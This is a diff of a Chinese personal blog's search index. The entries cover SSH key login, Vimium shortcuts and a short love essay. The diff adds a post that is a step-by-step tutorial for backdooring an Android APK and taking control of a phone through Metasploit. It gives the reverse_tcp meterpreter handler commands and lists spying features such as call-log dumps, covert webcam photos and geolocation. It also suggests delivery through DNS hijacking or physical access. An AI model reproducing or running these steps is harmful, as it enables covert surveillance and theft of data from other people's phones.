@@ -1,28 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[SSH免密登录]]></title>
+    <url>%2F2018%2F03%2F07%2Fssh-keygen%2F</url>
+    <content type="text"><![CDATA[======================== SSH单密钥配置 生成ssh密钥文件 ssh-keygen -t ecdsa -b 521 1234-t 为指定加密算法类型，支持rsa，dsa，ecdsa-b 指定密钥大小，ecdsa算法默认大小为256位ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高 如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。 将公钥上传到远程服务器 ssh-copy-id username@remote_ip ssh-copy-id会将你的刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中 测试 ssh username@remote_ip SSH多密钥配置 生成密钥 ssh-keygen -t ecdsa -b 521 -f ~/.ssh/one -C “remote_ip” 12-f 指定生成密钥保存位置与名称 建议放到 $HOME/.ssh/目录下-C 添加注释，类如邮箱，远程主机IP，用户名之类，默认为本机主机名和用户 将公钥上传到远程服务器 ssh-copy-id -i ~/.ssh/one.pub username@remote_ip 1-i 指定上传公钥名称 创建SSH配置文件来管理多组密钥 vim ~/.ssh/config 123456Host remote_ip1 IdentitiesOnly yes IdentityFile ~/.ssh/oneHost remote_ip2 IdentitiesOnly yes IdentityFile ~/.ssh/two Host后面写: 远程主机ip地址IdentityFile后面写 你创建的密钥位置与名称 测试 ssh username@remote_ip 其他 将本地文件上传到远程主机 scp local_file remote_username@remote_ip:remote_folder 将远程主机中的文件下载到本地 scp remote_username@remote_ip:remote_file local_folder 参考 https://wiki.archlinux.org/index.php/SSH_keys http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html]]></content>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[生成apk后门实现msf控制安卓手机]]></title>
     <url>%2F2018%2F03%2F02%2Fbackdoor-apk%2F</url>
     <content type="text"><![CDATA[======================== 实验环境： Kali Linux android 同一局域网 生成后门安装依赖环境 apt-get install lib32z1 lib32ncurses5 lib32stdc++6 下载 backdoor-apk git clone https://github.com/dana-at-cp/backdoor-apk.git 下载完成后进入文件目录 cd backdoor-apk/backdoor-apk 将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行 ./backdoor-apk.sh test.apkPS:test.apk 为事先准备好的正常apk应用名 选择payload 出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件 meterpreter执行 msfconsole -r backdoor-apk.rc 手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell可以看到获得反弹shell 会话用sessions -i number 切换到当前会话此处执行check_root 测试其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等 可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样12345use exploit/multi/handler set payload android/meterpreter/reverse_tcp set lhost 192.168.0.105 set lport 8888 exploit 问题 [!] Failed to recompile original project with backdoor 现在很多应用都会做一些处理防止反编译，可以上 APKPure 或酷安 去找一些历史版本会增加成功概率 apktools 过旧，可以把Kail 更到最新 一定要把 apk 放到backdoor-apk.sh 所在目录下 拓展 外网环境可使用vps转发 或 ngrok穿透 参考 vps 转发 http://www.freebuf.com/sectool/136574.html ngrok穿透 http://www.freebuf.com/sectool/162046.html 植入木马方式 内网dns劫持: http://www.freebuf.com/sectool/136574.html 物理接触 参考 http://www.secist.com/archives/680.html http://www.4hou.com/mobile/8290.html]]></content>
+      <tags>
+        <tag>Web</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[Vimium 入门]]></title>
     <url>%2F2018%2F02%2F28%2FVimium-use%2F</url>
     <content type="text"><![CDATA[======================== vimium 介绍Vimium 是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升一定要试试这个插件。 下载地址：ChromeFirefox Vimium使用总结 页内浏览 j:向下滚动一点 k:向上滚动一点 gg:到页面最底部 G:到页面最底部 d:向下翻一屏 u:向上翻一屏 gs:查看源代码 gi:聚焦到第一个输入点 i/Esc: 输入模式/命令模式 快速选取 /:快速查找 [n] 向下匹配项 [N]向上匹配 yy:拷贝当前页面的URL yf:拷贝指定URL V:选取指定段内容 标签操作 t:创建一个新标签 T:显示所有标签 J:上一个标签 K:下一个标签 x:关闭当前标签 X:恢复上个关闭的标签 r:重新加载 [F5] 导航操作 p/P : 打开剪贴板内的链接,否则进行搜索 o/O:从收藏夹、历史记录打开：如果你输的是一个网址，回车还能直接打开 f/F: 快速打开某链接 gf：跳到父页面 H:回退上一个历史页面 [&lt;-] L:回到下一个历史页面 [-&gt;] 浏览器快捷键 ctrl+w: 关闭当前页面 ctrl+t: 新建标签 F6: 在当前页面输入URL ctrl+d: 为当前页添加书签 其他某些网站可能自带键盘映射，可为其单独设置 unmapAll 以恢复网页自带键盘映射。]]></content>
-      <categories>
-        <category>Tools</category>
-      </categories>
       <tags>
-        <tag>基础</tag>
+        <tag>Tools</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[随笔・一]]></title>
     <url>%2F2018%2F02%2F16%2Fsuinian%2F</url>
     <content type="text"><![CDATA[=========================== 喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。 初心捡起一段坚韧的丝线，串起断线的曾经。抓住夏的尾巴，将时钟拨到最初。夏花灿烂那时，是我们的开始。贪念着空气里的丝丝香甜，就这样静静地，静静地望着你。截一段甜到发稠的岁月，缓缓流淌在时光里。折一只小船，轻轻飘荡到你的心房。小船轻触你内心的柔软，扒开你坚硬的外壳。 原来你是最初的心动，是夏日最绵软的清风。我想如果我爱你，可是我发现不是如果，我一直都在爱你。]]></content>
-      <categories>
-        <category>生活</category>
-      </categories>
       <tags>
         <tag>随笔</tag>
       </tags>
